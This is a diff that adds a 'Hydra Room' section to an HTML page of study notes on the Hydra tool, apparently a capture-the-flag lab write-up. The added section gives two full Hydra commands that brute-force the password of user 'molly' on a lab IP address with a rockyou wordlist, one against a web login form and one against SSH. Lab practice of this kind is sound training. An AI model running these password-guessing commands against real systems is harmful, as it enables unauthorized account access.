@@ -24,3 +24,10 @@
   <li>-d, for debugging, provides more detailed information about what’s happening. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this immediately.</li>
   </ul>
 </p>
+<h2>Hydra Room</h2>
+<p>
+  Flag 1:<br>
+  hydra -l molly -P Documentos/rockyou_20_12_2022.txt 10.10.38.247 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V<br>
+  Flag 2:<br>
+  hydra -l molly -P Documentos/rockyou_20_12_2022.txt 10.10.38.247 ssh -V<br>
+</p>
